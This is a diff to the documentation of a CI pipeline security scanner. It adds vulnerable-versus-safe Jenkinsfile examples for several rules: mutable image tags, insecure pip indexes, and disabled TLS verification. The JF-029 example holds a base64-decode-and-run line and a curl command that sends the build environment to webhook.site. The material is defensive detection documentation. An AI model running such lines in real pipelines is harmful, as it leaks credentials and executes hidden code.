@@ -3823,6 +3823,37 @@ pipeline {
 
 **Recommendation.** Resolve each image to its current digest (`docker buildx imagetools inspect <ref>` prints it) and reference it via `image '<repo>@sha256:<digest>'`. Automate refreshes with Renovate.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: ``image 'maven:3.9'`` is a mutable tag.
+// Docker Hub's maven team rebuilds it on every Maven
+// point release; a publisher takeover ships code into
+// every Jenkins build using the tag.
+pipeline {
+  agent {
+    docker { image 'maven:3.9' }
+  }
+  stages {
+    stage('build') {
+      steps { sh 'mvn -B verify' }
+    }
+  }
+}
+
+// Safe: pin to the content-addressable digest.
+pipeline {
+  agent {
+    docker { image 'maven@sha256:abc123...' }  // maven:3.9.5-eclipse-temurin-21
+  }
+  stages {
+    stage('build') {
+      steps { sh 'mvn -B verify' }
+    }
+  }
+}
+```
+
 **Source:** [`JF-009`](../providers/jenkins.md#jf-009) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-018 }
@@ -3834,6 +3865,42 @@ pipeline {
 **Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: pip uses a plaintext-HTTP index and
+// ``--trusted-host`` silences hash verification.
+pipeline {
+  agent { docker { image 'python@sha256:abc123...' } }
+  stages {
+    stage('install') {
+      steps {
+        sh '''
+          pip install --index-url http://internal-pypi.example.com/simple \
+            --trusted-host internal-pypi.example.com -r requirements.txt
+        '''
+      }
+    }
+  }
+}
+
+// Safe: HTTPS + ``--require-hashes``. Internal CA
+// installed in the agent image's trust store.
+pipeline {
+  agent { docker { image 'python@sha256:abc123...' } }
+  stages {
+    stage('install') {
+      steps {
+        sh '''
+          pip install --index-url https://internal-pypi.example.com/simple \
+            --require-hashes -r requirements.txt
+        '''
+      }
+    }
+  }
+}
+```
 
 **Source:** [`JF-018`](../providers/jenkins.md#jf-018) in the [Jenkins provider](../providers/jenkins.md).
 
@@ -3885,6 +3952,43 @@ pipeline {
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: ``git -c http.sslverify=false clone``
+// (or ``npm config set strict-ssl false``,
+// ``NODE_TLS_REJECT_UNAUTHORIZED=0``) disables
+// certificate verification. Any network attacker MITMs
+// the registry / remote and ships substituted bytes.
+pipeline {
+  agent any
+  stages {
+    stage('clone') {
+      steps {
+        sh 'git -c http.sslverify=false clone https://internal/repo.git'
+      }
+    }
+  }
+}
+
+// Safe: install the missing CA into the agent's trust
+// store and keep verification on.
+pipeline {
+  agent any
+  stages {
+    stage('clone') {
+      steps {
+        sh '''
+          sudo cp /var/jenkins_home/ca/internal.crt /usr/local/share/ca-certificates/
+          sudo update-ca-certificates
+          git clone https://internal/repo.git
+        '''
+      }
+    }
+  }
+}
+```
+
 **Source:** [`JF-023`](../providers/jenkins.md#jf-023) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-024`: `input` approval step missing submitter restriction <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-024 }
@@ -3920,6 +4024,39 @@ pipeline {
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: a stage body executes a base64-decoded
+// payload, exfils to a third-party webhook, or runs a
+// known miner binary. A malicious PR (or a compromised
+// maintainer) lands the payload in the Jenkinsfile;
+// every subsequent build runs it.
+pipeline {
+  agent any
+  stages {
+    stage('build') {
+      steps {
+        sh '''
+          echo Z2g6Li4uIA== | base64 -d | sh
+          curl https://webhook.site/abc?env=$(env|base64)
+        '''
+      }
+    }
+  }
+}
+
+// Safe: the build does only what the build does. No
+// obfuscated execution, no exfil POSTs, no
+// base64 -d | sh pipelines.
+pipeline {
+  agent any
+  stages {
+    stage('build') { steps { sh 'make build' } }
+  }
+}
+```
+
 **Source:** [`JF-029`](../providers/jenkins.md#jf-029) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-031`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-031 }
@@ -3939,6 +4076,42 @@ pipeline {
 **How this is detected.** The HTTP Request plugin's ``ignoreSslErrors: true`` flag tells the step to accept any TLS certificate (including self-signed, expired, hostname-mismatched, and attacker-presented) when calling the configured URL. Pipelines that hit internal services with broken trust chains frequently reach for it as a shortcut; the runtime consequence is that whatever the response body feeds into (``readJSON``, ``writeFile``, an arg to a subsequent deploy step) is now attacker-controllable for anyone who can MITM the controller-to-service connection. Complements JF-023 (which catches the broader catalog of curl/wget/git TLS bypasses) — JF-035 is specific to the ``httpRequest`` plugin step Jenkins pipelines commonly use for API calls.
 
 **Recommendation.** Drop ``ignoreSslErrors: true`` from the ``httpRequest`` step. Fix certificate trust at the source: install the internal CA into the controller's truststore, or use a properly-issued certificate on the upstream service. Disabling verification on a CI runner lets any actor on the network path between Jenkins and the target inject responses, including payloads that flow into downstream stages.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: ``httpRequest`` with
+// ``ignoreSslErrors: true`` disables certificate
+// verification on the request. A MITM proxy or DNS
+// hijack between Jenkins and the API endpoint
+// substitutes the response, and the build trusts
+// whatever bytes arrive.
+pipeline {
+  agent any
+  stages {
+    stage('fetch') {
+      steps {
+        httpRequest url: 'https://api.example.com/manifest.json',
+                    ignoreSslErrors: true
+      }
+    }
+  }
+}
+
+// Safe: keep TLS verification on. For internal APIs on
+// a private CA, install the CA into the Jenkins JVM
+// trust store via the Java keystore (cacerts).
+pipeline {
+  agent any
+  stages {
+    stage('fetch') {
+      steps {
+        httpRequest url: 'https://api.example.com/manifest.json'
+      }
+    }
+  }
+}
+```
 
 **Source:** [`JF-035`](../providers/jenkins.md#jf-035) in the [Jenkins provider](../providers/jenkins.md).
 
